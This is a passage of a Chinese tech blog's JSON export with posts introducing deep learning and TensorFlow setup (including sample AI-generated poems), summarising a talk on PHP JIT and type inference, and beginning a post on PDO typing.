避命抛醺背暮时，见川谁哭梦知年。却随筵里腥消极，不遇嘉唐两带春。大岁秘魔窥石税，鹤成应听白云中。朝浮到岸鸱巇恨，不向青青听径长。 楚田馀绝宇氤氲，细雨洲头万里凉。百叶长看如不尽，水东春夜足残峰。湖头风浪斜暾鼓，北阙别罹初里村。山在四天三顾客，辘轳争养抵丹墀。 九日重门携手时，吟疑须渴辞金香。钓来犹绕结茶酒，衣上敬亭宁强烧。自明不肯疑恩日，琴馆寒霖急暮霜。划口濡于孤姹末，出谢空卿寄银机。莲龛不足厌丝屦，华骑敷砧出钓矶。 为到席中逢旧木，容华道路不能休。时闲客后多时石，暗水天边暖人说。风弄霜花嗥明镜，犀成磨逐乍牵肠。何劳相听真行侍，石石班场古政蹄。 听巾邑外见朱兰，杂时临厢北满香。门外玉坛花府古，香牌风出即升登。陵桥翠黛销仙妙，晓接红楼叠影闻。敢把苦谣金字表，应从科剑独频行。 昨日荣枯桃李庆，紫骝坚黠自何侵。险知河在皆降月，汉县烟波白发来。仍省封身明月阁，不知吹水洽谁非。更拟惭送风痕去，只怕鲸雏是后仙。 另外，我抽取其中一些个人认为写得比较好的诗句（以前跑出来的，不在上图中）： img 该模型比较简单，写诗的水平不如最前面我介绍的美国研究者demo，但是，所采用的基本方法应该是类似的，只是他做的更为复杂。 另外，这是一个通用模型，可以学习不同的内容（古诗、现代诗、宋词或者英文诗等），就可以生成对应的结果。 七、深度学习的入门学习体会 人工智能和深度学习技术并不神秘，更像是一个新型的工具，通过喂数据给它，然后，它能发现这些数据背后的规律，并为我们所用。 数学基础比较重要，这样有助于理解模型背后的数学原理，不过，从纯应用角度来说，并不一定需要完全掌握数学，也可以提前开始做一些尝试和学习。 我深深地感到计算资源非常缺乏，每次调整程序的参数或训练数据后，跑完一次训练集经常要很多个小时，部分场景不跑多一些训练集数据，看不出差别，例如写诗的案例。个人感觉，这个是制约AI发展的重要问题，它直接让程序的“调试”效率非常低下。 中文文档比较少，英文文档也不多，开源社区一直在快速更新，文档的内容过时也比较快。因此，入门学习时遇到的问题会比较多，并且缺乏成型的文档。 八、小结我不知道人工智能的时代是否真的会来临，也不知道它将要走向何方，但是，毫无疑问，它是一种全新的技术思维模式。更好的探索和学习这种新技术，然后在业务应用场景寻求结合点，最终达到帮助我们的业务获得更好的成果，一直以来，就是我们工程师的核心宗旨。另一方面，对发展有重大推动作用的新技术，通常会快速的发展并且走向普及，就如同我们的编程一样，因此，人人都可以做深度学习应用，并非只是一句噱头。 参考文档： TensorFlow中文社区TensorFlow英文社区 数学相关的内容： 高中和大学数学部分内容线性代数视频 转载自小时光茶社","categories":[],"tags":[{"name":"AI","slug":"AI","permalink":"http://www.twosee.cn/tags/AI/"}]},{"title":"人人都可以做深度学习应用 入门篇","slug":"AI-everyone","date":"2018-01-03T21:38:41.000Z","updated":"2018-01-08T07:19:45.000Z","comments":true,"path":"2018/01/04/AI-everyone/","link":"","permalink":"http://www.twosee.cn/2018/01/04/AI-everyone/","excerpt":"2017年围棋界发生了一件比较重要事，Master（Alphago）以60连胜横扫天下，击败各路世界冠军，人工智能以气势如虹的姿态出现在我们人类的面前。围棋曾经一度被称为“人类智慧的堡垒”，如今，这座堡垒也随之成为过去。从2016年三月份AlphaGo击败李世石开始，AI全面进入我们大众的视野，对于它的讨论变得更为火热起来，整个业界普遍认为，它很可能带来下一次科技革命，并且，在未来可预见的10多年里，深刻地改变我们的生活。","text":"2017年围棋界发生了一件比较重要事，Master（Alphago）以60连胜横扫天下，击败各路世界冠军，人工智能以气势如虹的姿态出现在我们人类的面前。围棋曾经一度被称为“人类智慧的堡垒”，如今，这座堡垒也随之成为过去。从2016年三月份AlphaGo击败李世石开始，AI全面进入我们大众的视野，对于它的讨论变得更为火热起来，整个业界普遍认为，它很可能带来下一次科技革命，并且，在未来可预见的10多年里，深刻地改变我们的生活。 其实，AI除了可以做我们熟知的人脸、语音等识别之外，它可以做蛮多有趣的事情。 例如，让AI学习大量古诗之后写古诗，并且可以写出质量非常不错的古诗。 img 又或者，将两部设计造型不同的汽车进行融合，形成全新一种设计风格的新汽车造型。 img 还有，之前大家在朋友圈里可能看过的，将相片转换成对应的艺术风格的画作。 img 当前，人工智能已经在图像、语音等多个领域的技术上，取得了全面的突破。与此同时，另外一个问题随之而来，如果这一轮的AI浪潮真的将会掀起新的科技革命，那么在可预见的未来，我们整个互联网都将发生翻天覆地的变化，深刻影响我们的生活。那么作为普通业务开发工程师的我，又应该以何种态度和方式应对这场时代洪流的冲击呢？ 在回答这个问题之前，我们先一起看看上一轮由计算机信息技术引领的科技革命中，过去30多年中国程序员的角色变化： img 通过上图可以简总结：编程技术在不断地发展并且走向普及，从最开始掌握在科学家和专家学者手中的技能，逐渐发展为一门大众技能。换而言之，我们公司内很多资深的工程师，如果带着今天对编程和计算机的理解和理念回到1980年，那么他无疑就是那个时代的计算机专家。 如果这一轮AI浪潮真的会带来新的一轮科技革命，那么我们相信，它也会遵循类似的发展轨迹，逐步发展和走向普及。如果基于这个理解，或许，我们可以通过积极学习，争取成为第一代AI工程师。 二、深度学习技术这一轮AI的技术突破，主要源于深度学习技术，而关于AI和深度学习的发展历史我们这里不重复讲述，可自行查阅。我用了一个多月的业务时间，去了解和学习了深度学习技术，在这里，我尝试以一名业务开发工程师的视角，以尽量容易让大家理解的方式一起探讨下深度学习的原理，尽管，受限于我个人的技术水平和掌握程度，未必完全准确。 1. 人的智能和神经元人类智能最重要的部分是大脑，大脑虽然复杂，它的组成单元却是相对简单的，大脑皮层以及整个神经系统，是由神经元细胞组成的。而一个神经元细胞，由树突和轴突组成，它们分别代表输入和输出。连在细胞膜上的分叉结构叫树突，是输入，那根长长的“尾巴”叫轴突，是输出。神经元输出的有电信号和化学信号，最主要的是沿着轴突细胞膜表面传播的一个电脉冲。忽略掉各种细节，神经元，就是一个积累了足够的输入，就产生一次输出（兴奋）的相对简单的装置。 img 树突和轴突都有大量的分支，轴突的末端通常连接到其他细胞的树突上，连接点上是一个叫“突触”的结构。一个神经元的输出通过突触传递给成千上万个下游的神经元，神经元可以调整突触的结合强度，并且，有的突触是促进下游细胞的兴奋，有的是则是抑制。一个神经元有成千上万个上游神经元，积累它们的输入，产生输出。 img 人脑有1000亿个神经元，1000万亿个突触，它们组成人脑中庞大的神经网络，最终产生的结果即是人的智能。 2. 人工神经元和神经网络一个神经元的结构相对来说是比较简单的，于是，科学家们就思考，我们的AI是否可以从中获得借鉴？神经元接受激励，输出一个响应的方式，同计算机中的输入输出非常类似，看起来简直就是量身定做的，刚好可以用一个函数来模拟。 img 通过借鉴和参考神经元的机制，科学家们模拟出了人工神经元和人工神经网络。当然，通过上述这个抽象的描述和图，比较难让大家理解它的机制和原理。我们以“房屋价格测算”作为例子，一起来看看： 一套房子的价格，会受到很多因素的影响，例如地段、朝向、房龄、面积、银行利率等等，这些因素如果细分，可能会有几十个。一般在深度学习模型里，这些影响结果的因素我们称之为特征。我们先假设一种极端的场景，例如影响价格的特征只有一种，就是房子面积。于是我们收集一批相关的数据，例如，50平米50万、93平米95万等一系列样本数据，如果将这些样本数据放到而为坐标里看，则如下图： img 然后，正如我们前面所说的，我们尝试用一个“函数”去拟合这个输入（面积x）和输出（价格y），简而言之，我们就是要通过一条直线或者曲线将这些点“拟合”起来。 假设情况也比较极端，这些点刚好可以用一条“直线”拟合（真实情况通常不会是直线），如下图： img 那么我们的函数是一个一次元方程f(x) = ax +b，当然，如果是曲线的话，我们得到的将是多次元方程。我们获得这个f(x) = ax +b的函数之后，接下来就可以做房价“预测”，例如，我们可以计算一个我们从未看见的面积案例81.5平方米，它究竟是多少钱？ 这个新的样本案例，可以通过直线找到对应的点（黄色的点），如图下： img 粗略的理解，上面就是AI的概括性的运作方式。这一切似乎显得过于简单了？当然不会，因为，我们前面提到，影响房价其实远不止一个特征，而是有几十个，这样问题就比较复杂了，接下来，这里则要继续介绍深度学习模型的训练方式。这部分内容相对复杂一点，我尽量以业务工程师的视角来做一个粗略而简单的阐述。 3. 深度学习模型的训练方式当有好几十个特征共同影响价格的时候，自然就会涉及权重分配的问题，例如有一些对房价是主要正权重的，例如地段、面积等，也有一些是负权重的，例如房龄等。 （1）初始化权重计算 那么，第一个步其实是给这些特征加一个权重值，但是，最开始我们根本不知道这些权重值是多少？怎么办呢？不管那么多了，先给它们随机赋值吧。随机赋值，最终计算出来的估算房价肯定是不准确的，例如，它可能将价值100万的房子，计算成了10万。 （2）损失函数 因为现在模型的估值和实际估值差距比较大，于是，我们需要引入一个评估“不准确”程度的衡量角色，也就是损失（loss）函数，它是衡量模型估算值和真实值差距的标准，损失函数越小，则模型的估算值和真实值的察觉越小，而我们的根本目的，就是降低这个损失函数。让刚刚的房子特征的模型估算值，逼近100万的估算结果。 （3）模型调整 通过梯度下降和反向传播，计算出朝着降低损失函数的方向调整权重参数。举一个不恰当的比喻，我们给面积增加一些权重，然后给房子朝向减少一些权重（实际计算方式，并非针对单个个例特征的调整），然后损失函数就变小了。 （4）循环迭代 调整了模型的权重之后，就可以又重新取一批新的样本数据，重复前面的步骤，经过几十万次甚至更多的训练次数，最终估算模型的估算值逼近了真实值结果，这个模型的则是我们要的“函数”。 img 为了让大家更容易理解和直观，采用的例子比较粗略，并且讲述深度学习模型的训练过程，中间省略了比较多的细节。讲完了原理，那么我们就开始讲讲如何学习和搭建demo。 三、深度学习环境搭建在2个月前，人工智能对我来说，只是一个高大上的概念。但是，经过一个多月的业余时间的认真学习，我发现还是能够学到一些东西，并且跑一些demo和应用出来的。 1. 学习的提前准备 （1）部分数学内容的复习，高中数学、概率、线性代数等部分内容。（累计花费了10个小时，挑了关键的点看了下，其实还是不太够，只能让自己看公式的时候，相对没有那么懵） （2）Python基础语法学习。（花费了3个小时左右，我以前从未写过Python，因为后面Google的TensorFlow框架的使用是基于Python的） （3）Google的TensorFlow深度学习开源框架。（花费了10多个小时去看） 数学基础好或者前期先不关注原理的同学，数学部分不看也可以开始做，全凭个人选择。 2. Google的TensorFlow开源深度学习框架 深度学习框架，我们可以粗略的理解为是一个“数学函数”集合和AI训练学习的执行框架。通过它，我们能够更好的将AI的模型运行和维护起来。 深度学习的框架有各种各样的版本（Caffe、Torch、Theano等等），我只接触了Google的TensorFlow，因此，后面的内容都是基于TensorFlow展开的，它的详细介绍这里不展开讲述，建议直接进入官网查看。非常令人庆幸的是TensorFlow比较早就有中文社区了，尽管里面的内容有一点老，搭建环境方面有一些坑，但是已经属于为数不多的中文文档了，大家且看且珍惜。 TensorFlow 的中文社区 TensorFlow 的英文社区 3. TensorFlow环境搭建 环境搭建本身并不复杂，主要解决相关的依赖。但是，基础库的依赖可以带来很多问题，因此，建议尽量一步到位，会简单很多。 （1）操作系统 我搭建环境使用的机器是腾讯云上的机器，软件环境如下： 操作系统：CentOS 7.2 64位（GCC 4.8.5） 因为这个框架依赖于python2.7和glibc 2.17。比较旧的版本的CentOS一般都是python2.6以及版本比较低的glibc，会产生比较的多基础库依赖问题。而且，glibc作为Linux的底层库，牵一发动全身，直接对它升级是比较复杂，很可能会带来更多的环境异常问题。 （2）软件环境 我目前安装的Python版本是python-2.7.5，建议可以采用yum install python的方式安装相关的原来软件。然后，再安装 python内的组件包管理器pip，安装好pip之后，接下来的其他软件的安装就相对比较简单了。 例如安装TensorFlow，可通过如下一句命令完成（它会自动帮忙解决一些库依赖问题）： 1pip install -U tensorflow 这里需要特别注意的是，不要按照TensorFlow的中文社区的指引去安装，因为它会安装一个非常老的版本（0.5.0），用这个版本跑很多demo都会遇到问题的。而实际上，目前通过上述提供的命令安装，是tensorflow (1.0.0)的版本了。 img Python（2.7.5）下的其他需要安装的关键组件： tensorflow (0.12.1)，深度学习的核心框架 image (1.5.5)，图像处理相关，部分例子会用到 PIL (1.1.7)，图像处理相关，部分例子会用到 除此之后，当然还有另外的一些依赖组件，通过pip list命令可以查看我们安装的python组件： appdirs (1.4.0) backports.ssl-match-hostname (3.4.0.2) chardet (2.2.1) configobj (4.7.2) decorator (3.4.0) Django (1.10.4) funcsigs (1.0.2) image (1.5.5) iniparse (0.4) kitchen (1.1.1) langtable (0.0.31) mock (2.0.0) numpy (1.12.0) packaging (16.8) pbr (1.10.0) perf (0.1) PIL (1.1.7) Pillow (3.4.2) pip (9.0.1) protobuf (3.2.0) pycurl (7.19.0) pygobject (3.14.0) pygpgme (0.3) pyliblzma (0.5.3) pyparsing (2.1.10) python-augeas (0.5.0) python-dmidecode (3.10.13) pyudev (0.15) pyxattr (0.5.1) setuptools (34.2.0) six (1.10.0) slip (0.4.0) slip.dbus (0.4.0) tensorflow (1.0.0) urlgrabber (3.10) wheel (0.29.0) yum-langpacks (0.4.2) yum-metadata-parser (1.1.4) 按照上述提供的来搭建系统，可以规避不少的环境问题。 搭建环境的过程中，我遇到不少问题。例如：在跑官方的例子时的某个报错，AttributeError: ‘module’ object has no attribute ‘gfile’，就是因为安装的TensorFlow的版本比较老，缺少gfile模块导致的。而且，还有各种各样的。（不要问我是怎么知道的，说多了都是泪啊~） 更详细的安装说明：Installing TensorFlow on Ubuntu （3）TensorFlow环境测试运行 测试是否安装成功，可以采用官方的提供的一个短小的例子，demo生成了一些三维数据, 然后用一个平面拟合它们（官网的例子采用的初始化变量的函数是initialize_all_variables，该函数在新版本里已经被废弃了）： 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python#coding=utf-8import tensorflow as tfimport numpy as np# 使用 NumPy 生成假数据(phony data), 总共 100 个点.x_data = np.float32(np.random.rand(2, 100)) # 随机输入y_data = np.dot([0.100, 0.200], x_data) + 0.300# 构造一个线性模型# b = tf.Variable(tf.zeros([1]))W = tf.Variable(tf.random_uniform([1, 2], -1.0, 1.0))y = tf.matmul(W, x_data) + b# 最小化方差loss = tf.reduce_mean(tf.square(y - y_data))optimizer = tf.train.GradientDescentOptimizer(0.5)train = optimizer.minimize(loss)# 初始化变量,旧函数（initialize_all_variables）已经被废弃，替换为新函数init = tf.global_variables_initializer()# 启动图 (graph)sess = tf.Session()sess.run(init)# 拟合平面for step in xrange(0, 201): sess.run(train) if step % 20 == 0: print step, sess.run(W), sess.run(b)# 得到最佳拟合结果 W: [[0.100 0.200]], b: [0.300] 运行的结果类似如下： img 经过200次的训练，模型的参数逐渐逼近最佳拟合的结果（W: [[0.100 0.200]], b: [0.300]），另外，我们也可以从代码的“风格”中，了解到框架样本训练的基本运行方式。虽然，官方的教程后续会涉及越来越多更复杂的例子，但从整体上看，也是类似的模式。 img 步骤划分 准备数据：获得有标签的样本数据（带标签的训练数据称为有监督学习）； 设置模型：先构建好需要使用的训练模型，可供选择的机器学习方法其实也挺多的，换而言之就是一堆数学函数的集合；损失函数和优化方式：衡量模型计算结果和真实标签值的差距； 真实训练运算：训练之前构造好的模型，让程序通过循环训练和学习，获得最终我们需要的结果“参数”； 验证结果：采用之前模型没有训练过的测试集数据，去验证模型的准确率。 其中，TensorFlow为了基于python实现高效的数学计算，通常会使用到一些基础的函数库，例如Numpy（采用外部底层语言实现），但是，从外部计算切回到python也是存在开销的，尤其是在几万几十万次的训练过程。因此，Tensorflow不单独地运行单一的函数计算，而是先用图描述一系列可交互的计算操作流程，然后全部一次性提交到外部运行（在其他机器学习的库里，也是类似的实现）。 所以，上述流程图中，蓝色部分都只是设置了“计算操作流程”，而绿色部分开始才是真正的提交数据给到底层库进行实际运算，而且，每次训练一般是批量执行一批数据的。","categories":[],"tags":[{"name":"AI","slug":"AI","permalink":"http://www.twosee.cn/tags/AI/"}]},{"title":"PHP Next JIT","slug":"PHP-Next-JIT","date":"2018-01-03T21:28:57.000Z","updated":"2018-01-08T07:43:56.000Z","comments":true,"path":"2018/01/04/PHP-Next-JIT/","link":"","permalink":"http://www.twosee.cn/2018/01/04/PHP-Next-JIT/","excerpt":"12月23日，由开源中国联合中国电子技术标准化研究院主办的2017源创会年终盛典在北京万豪酒店顺利举行。作为年末最受期待的开源技术分享盛会，国内顶尖技术大拿、知名技术团队、优秀开源项目作者，及近1000名技术爱好者共聚一堂，探讨最前沿、最流行的技术话题和方向，推动国内开源创新体系发展，共建国内开源生态标准。PHP7 已发布近两年, 大幅的性能提升使得 PHP 的应用场景更加广泛，刚刚发布的 PHP7.2 相比 PHP7.1 又有了近 10% 的提升。在本次大会上，链家集团技术副总裁、PHP 开发组核心成员鸟哥发表了以 “ PHP Next: JIT ”为主题的演讲，分享了 PHP 的下一个性能提升的主要举措：JIT 的进展, 以及下一个大版本的 PHP 可能的特性。他表示，JIT 相比 PHP7.2 ，在一些场景可以达到三倍，但由于 JIT 的核心前提是类型推断，得到的信息越多效果越好，因此也容易受到限制。 JIT 发布后，随着更优秀的代码出现，性能提升会更明显。 惠新宸惠新宸 ，国内最有影响力的PHP技术专家， PHP开发组核心成员 , PECL开发者 , Zend公司外聘顾问, 曾供职于雅虎，百度，新浪。现任链家集团技术副总裁兼总架构师。PHP 7 的核心开发者，PHP5.4，5.5的主要开发者。也是Yaf (Yet another framework)，Yar(Yet another RPC framework) 以及Yac(Yet another Cache)、Taint等多个开源项目的作者，同时也是APC，Opcache ，Msgpack等项目的维护者。 演讲实录PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT","text":"12月23日，由开源中国联合中国电子技术标准化研究院主办的2017源创会年终盛典在北京万豪酒店顺利举行。作为年末最受期待的开源技术分享盛会，国内顶尖技术大拿、知名技术团队、优秀开源项目作者，及近1000名技术爱好者共聚一堂，探讨最前沿、最流行的技术话题和方向，推动国内开源创新体系发展，共建国内开源生态标准。PHP7 已发布近两年, 大幅的性能提升使得 PHP 的应用场景更加广泛，刚刚发布的 PHP7.2 相比 PHP7.1 又有了近 10% 的提升。在本次大会上，链家集团技术副总裁、PHP 开发组核心成员鸟哥发表了以 “ PHP Next: JIT ”为主题的演讲，分享了 PHP 的下一个性能提升的主要举措：JIT 的进展, 以及下一个大版本的 PHP 可能的特性。他表示，JIT 相比 PHP7.2 ，在一些场景可以达到三倍，但由于 JIT 的核心前提是类型推断，得到的信息越多效果越好，因此也容易受到限制。 JIT 发布后，随着更优秀的代码出现，性能提升会更明显。 惠新宸惠新宸 ，国内最有影响力的PHP技术专家， PHP开发组核心成员 , PECL开发者 , Zend公司外聘顾问, 曾供职于雅虎，百度，新浪。现任链家集团技术副总裁兼总架构师。PHP 7 的核心开发者，PHP5.4，5.5的主要开发者。也是Yaf (Yet another framework)，Yar(Yet another RPC framework) 以及Yac(Yet another Cache)、Taint等多个开源项目的作者，同时也是APC，Opcache ，Msgpack等项目的维护者。 演讲实录PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT 鸟哥：PHP Next: JIT","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://www.twosee.cn/tags/php/"}]},{"title":"2017年PHP开发者大会总结 鸟哥JIT篇","slug":"THE-NEXT-GENERATION-OF-PHP","date":"2018-01-03T21:21:37.000Z","updated":"2018-01-08T07:19:13.000Z","comments":true,"path":"2018/01/04/THE-NEXT-GENERATION-OF-PHP/","link":"","permalink":"http://www.twosee.cn/2018/01/04/THE-NEXT-GENERATION-OF-PHP/","excerpt":"鸟哥本次分享的主要内容是，在php7发布的这两年期间他们的主要工作，包括release的7.1和正在开发中的jit分支。说实话，由于本人水平有限，鸟哥分享的内容只能大概听懂意思，知道他们在做什么，但具体原理细节，鸟哥分享的我还真听不懂。这里就对鸟哥的分享内容做个总结。 php7之后还有什么？JITphp7于15年正式发布，他的最大卖点是，无感知的100%性能提升，包含了运行速度与内存消耗。那么在此之后php该往哪里发展呢？目前已经在开发的一个大方向就是JIT JIT是什么？为什么是JIT？鸟哥并没有做过多的解释。我就谈一些我的肤浅认识，给phper们提供些参考。 首先JIT（just in time）并非是新技术，一大批语言如java早已实现。JIT的思想很简单，即在程序运行时动态对程序进行编译，生成平台相关的机器码，从而加快程序运行速度。 php文件的执行流程大致是首先引擎加载php文件，解释器逐条解释执行代码。引入JIT后，前面一样，重点是JIT编译器会根据Runtime信息对热点代码进行动态编译生成机器码，然后这部分代码以后就可以直接执行了，而不需要解释器逐条解释执行了，运行效率便得到了提升 看到这里不知道大家是否和我有一样的疑问，既然编译为机器码执行的效率那么高，为何不在项目正式部署前全部进行编译，何必在运行时编译？要知道运行时编译也会增加程序的执行时间的。我在查阅了一些资料和一番思考后，有以下一些浅见 代码发布前先编译，是比JIT更早的通用办法，称为AOT（ahead of time），c语言便是这种执行模式。关于这两种模式孰优孰劣，学术界一直争论不休，目前也没有定论。但JIT相比AOT有这样几个优点 发布速度快。不用每次都编译，发布速度自然快 优化效率更好。因为JIT是基于Runtime信息，比AOT更“了解”代码，优化的效率更好。比如分析Runtime得知某个变量虽然声明是10个字节，但运行过程中一直是1个字节，那么就可以减小程序内存消耗；再比如某段代码始终未被执行，JIT则可以直接将其忽略 粒度更精细。JIT可以只针对hotspot（热点）进行编译，热点可能是一个函数或者只是一个代码段 对码农透明。JIT无须码农自己对程序根据不同平台进行编译发布，只需要写高级代码即可 基于以上几个优点，再结合php一贯的简单易用原则，我想JIT确实是不错的选择。不过php也是支持AOT的，有兴趣的同学可以查一下。","text":"鸟哥本次分享的主要内容是，在php7发布的这两年期间他们的主要工作，包括release的7.1和正在开发中的jit分支。说实话，由于本人水平有限，鸟哥分享的内容只能大概听懂意思，知道他们在做什么，但具体原理细节，鸟哥分享的我还真听不懂。这里就对鸟哥的分享内容做个总结。 php7之后还有什么？JITphp7于15年正式发布，他的最大卖点是，无感知的100%性能提升，包含了运行速度与内存消耗。那么在此之后php该往哪里发展呢？目前已经在开发的一个大方向就是JIT JIT是什么？为什么是JIT？鸟哥并没有做过多的解释。我就谈一些我的肤浅认识，给phper们提供些参考。 首先JIT（just in time）并非是新技术，一大批语言如java早已实现。JIT的思想很简单，即在程序运行时动态对程序进行编译，生成平台相关的机器码，从而加快程序运行速度。 php文件的执行流程大致是首先引擎加载php文件，解释器逐条解释执行代码。引入JIT后，前面一样，重点是JIT编译器会根据Runtime信息对热点代码进行动态编译生成机器码，然后这部分代码以后就可以直接执行了，而不需要解释器逐条解释执行了，运行效率便得到了提升 看到这里不知道大家是否和我有一样的疑问，既然编译为机器码执行的效率那么高，为何不在项目正式部署前全部进行编译，何必在运行时编译？要知道运行时编译也会增加程序的执行时间的。我在查阅了一些资料和一番思考后，有以下一些浅见 代码发布前先编译，是比JIT更早的通用办法，称为AOT（ahead of time），c语言便是这种执行模式。关于这两种模式孰优孰劣，学术界一直争论不休，目前也没有定论。但JIT相比AOT有这样几个优点 发布速度快。不用每次都编译，发布速度自然快 优化效率更好。因为JIT是基于Runtime信息，比AOT更“了解”代码，优化的效率更好。比如分析Runtime得知某个变量虽然声明是10个字节，但运行过程中一直是1个字节，那么就可以减小程序内存消耗；再比如某段代码始终未被执行，JIT则可以直接将其忽略 粒度更精细。JIT可以只针对hotspot（热点）进行编译，热点可能是一个函数或者只是一个代码段 对码农透明。JIT无须码农自己对程序根据不同平台进行编译发布，只需要写高级代码即可 基于以上几个优点，再结合php一贯的简单易用原则，我想JIT确实是不错的选择。不过php也是支持AOT的，有兴趣的同学可以查一下。 但JIT技术也绝不是灵丹妙药，即便是编译也是需要时间的，当代码编译的时间消耗大于运行收益时，程序反而会变慢！会有这种情况吗？有的，比如某个项目中，热点并不明显，JIT编译的代码执行次数都很少，那么编译带来的收益是有可能小于编译本身的消耗的 以下是在标准测试中引入JIT技术后，php运行效率比7.2有100%的性能提升，不过在实际生产环境中效果不会有这么好 php7.1做了什么？类型预测php要想实现JIT，有一个难题必须解决，那就是变量的类型预测。试想如果在动态编译时还要进行大量的类型检查，性能将会大打折扣。php7中已经可以对变量类型进行控制，7.1则是更加完善了这个机制，可以说目前php已经是半强类型语言了。但由于php的弱类型历史，仍有大量代码运行前是无法得知变量类型的，所以在7.1中鸟哥进行了大量变量类型预测的工作，为后续JIT打基础 变量预测比较简单的一种办法是数据流分析，即分析代码的上下文，推断出变量的可能类型，比如 12345678function calc ($a1, $b2) &#123; // $a1: [ANY], $b2: [ANY] $T3 = $a1 * 2; // $T3: [LONG, DOUBLE] $a4 = $T3 % 1000; // $a4: [LONG] $T5 = $b2 * 3; // $T5: [LONG, DOUBLE] $b6 = $T5 % 1000; // $b6: [LONG] $T7 = $a4 + $b6; // $T7: [LONG, DOUBLE] return $T7;&#125; 其实这还是很困难的，鸟哥列举了一些开发过程中遇到的困难。比如变量的变量，$$var_name，或者顶层代码（即写在函数和类之外的代码）等等。php的历史包袱还是很重的。解决这些问题的简单办法就是强类型，但这又会降低开发效率，因为优化而影响phper的开发效率这是鸟哥所不愿意的，他认为业务永远是优先的，优化只是支线 目前鸟哥的解决办法就是对JIT进行分级，通过配置实现不同程度的动态编译，从而降低类型预测的难度。另外就是针对具体的场景，进行垂直优化 问答环节鸟哥的问答环节也非常精彩，原定一小时的分享最终超了一小时，下面我就凭着记忆对一些问题复现一下，可能存在偏差，将来我可不负责 php7.1那个诡异的函数返回类型限定是如何考虑的？鸟哥：没什么特别考虑，投票投出来的。首先说明一点，我投的是反对票。包括php的命名空间反斜杠我也是非常反对的，但可能由于我并没有对这方面太深的认识，没有理解其他开发者的意图。不过这些问题用习惯了也不是什么大的问题 升级php7后，遇到了一个诡异的引用计数的问题。具体记不清了，大致是他们发现有个应该回收的变量在升级后没有回收鸟哥：我现在不能给你准确答复，有可能是个bug，这个我随后跟进一下。但我想说的是你刚才介绍了你们在调试过程中对引用数的反复推算，其实不必纠结这，引用数用于垃圾回收时只有0和非0两种区别，我们在增加引用计数时可能有时候不是加1，而是加2，所以不要太在意具体是多少，确定大于0就行 一位学生提问者表示自己对高并发、分布式感兴趣，如何提升这方面的技能呢？鸟哥：这里你有一个误区。我们研究学习技术并不是为了学习而学习，而是为了解决实际的业务问题。你没有接触过这方面的业务，自然没有这方面的经验，等你真正有这个业务需求时，好多东西原理都很简单，使用方法也很成熟，自然就会了，这是个水到渠成的过程，不必刻意去追求那个“术”。另外，我多说一句是，其实当你真正处在这样的业务中时，你会发现这些事情很少需要你操心的，OP通过各种集群就已经把这些问题给屏蔽了。 鸟哥你是怎样看待php的前景呢？现在黑php的这么多人鸟哥：php的前景不要问我，要问你和我，整个php生态。天峰贡献一个swoole，php就有了高性能网络请求功能，xx贡献个php-ml，php就有了大数据处理功能，我今天贡献一个jit，php就有了动态编译能力。php发展到今天就是大家你一个小贡献，他一个小贡献积累出来的，所以php的前景好不好，要看我们生态，也希望大家踊跃贡献。至于黑php，我现在都懒得反驳了，有句话说的好，“黑php之前，先数数他给你挣了多少钱”，我一直认为业务是技术存在的理由，能不能快速响应需求、实现业务才是最根本的。 目前php没有连接池，非常不方便，不知道官方是否有支持计划？鸟哥：目前没有。不过这不正是一个给社区做贡献的机会吗？你们开发一个连接池，贡献到社区既方便了自己，也方便了大家。天峰昨天的分享PHP-X，不就是为了这样的事 鸟哥你是怎样看待全栈工程师这个概念的？鸟哥：我并不认同这个概念，我认为这是个伪命题。全栈这个概念最早是前端工程师提出来的，认为从前端到后端这是“全栈”，但我理解的全栈应该是对一个领域从底层原理到上层应用，这不才更应该叫做栈？自称全栈工程师的大部分属于只对各个领域多少有些认识而已。优秀的工程师不必刻意去追求全栈，你只需要在你的领域里不断深入就行，深度达到了，自然就有了广度，广度是深度的副产品，推而广之，就是所谓的全栈工程师是当你在一个领域深入到一定阶段后的副产品，而不是刻意在各个领域学出来的 php7对性能压榨已经比较彻底了，未来php是继续提高性能呢，还是增加新的特性？鸟哥：你想太多了，目前并未任何打算。JIT开发就非常困难了，这个是否能够成功还是未知数，下次大会如果JIT没有完成，我就没啥可分享的了。 现在在北京很难安家，将来回到二三线城市，php很难找工作，不知道鸟哥有什么看法吗？鸟哥：不必过于担心，不光是程序猿，其实还有好多公司也很难承受一线城市的成本，也在不断的往二三城市分流，所以找工作问题还是不大的。另外至于你担心php难找工作，那你可以换java、换go啊，一个程序猿不应该给自己打上标签，“xx程序猿”，你作为一个工程师，至少要精通3种以上的语言，而且要有良好的学习能力 鸟哥你是如何放松你的部下呢？会请他们去大保健吗？鸟哥：这个我没太多经验，不过就我自己来说，有时候加班多了还是比较累的，我有段时间脖子特别疼，一周得去至少三次按摩院按摩才能缓解，当然我说的是盲人按摩。后来我真的研究了颈椎康复指南，不是开玩笑，我是真研究了。人的脑袋大概12斤重，你想你整天顶个西瓜，要是颈椎肌肉不行的话，能不难受吗？所以我后来经常去健身房，锻炼颈椎，后来才慢慢好了","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://www.twosee.cn/tags/php/"}]},{"title":"如何在PDO查询中返回强类型","slug":"how-to-use-strong-type-in-pdo","date":"2017-12-30T05:11:36.000Z","updated":"2018-01-08T07:18:43.000Z","comments":true,"path":"2017/12/30/how-to-use-strong-type-in-pdo/","link":"","permalink":"http://www.twosee.cn/2017/12/30/how-to-use-strong-type-in-pdo/","excerpt":"","text":"有些驱动不支持或有限度地支持本地预处理。使用此设置强制PDO总是模拟预处理语句（如果为 TRUE ），或试着使用本地预处理语句（如果为 